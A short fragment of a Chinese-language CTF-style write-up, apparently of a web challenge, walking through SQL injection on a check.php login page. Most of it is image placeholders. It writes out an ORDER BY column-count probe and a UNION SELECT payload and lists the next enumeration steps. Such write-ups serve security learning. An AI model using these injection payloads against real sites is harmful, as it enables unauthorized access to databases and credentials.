...
![image-20220903093117758](attachments/image-20220903093117758.png)
...
![image-20220903093743198](attachments/image-20220903093743198.png)

回显登录成功，密码应该是一串 MD5 加密，但是解码失败，回过头来再进行注入。
测字段、看回显、查库、查表、查字段。
`check.php?username=1'order by 4%23&password=1`

![image-20220903094632190](attachments/image-20220903094632190.png)

说明有 3 个字段，再用 union 注入查看回显`check.php?username=1'union select 1,2,3%23&password=1`

![image-20220903095111304](attachments/image-20220903095111304.png)
...
![image-20220903095834969](attachments/image-20220903095834969.png)
...
![image-20220903105925161](attachments/image-20220903105925161.png)
...
![image-20220903111135796](attachments/image-20220903111135796.png)
